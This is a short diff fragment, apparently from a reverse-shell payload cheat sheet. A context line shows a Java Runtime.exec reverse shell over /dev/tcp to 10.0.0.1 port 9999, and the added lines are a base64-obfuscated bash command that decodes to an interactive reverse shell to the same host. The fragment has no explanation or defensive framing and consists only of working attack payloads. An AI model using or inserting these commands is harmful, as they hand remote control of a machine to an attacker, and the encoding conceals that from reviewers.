@@ -63,3 +63,8 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/9999;cat <&5 | while rea
 p.waitFor()
 ```
 ###
+###
+```
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
+```
+###
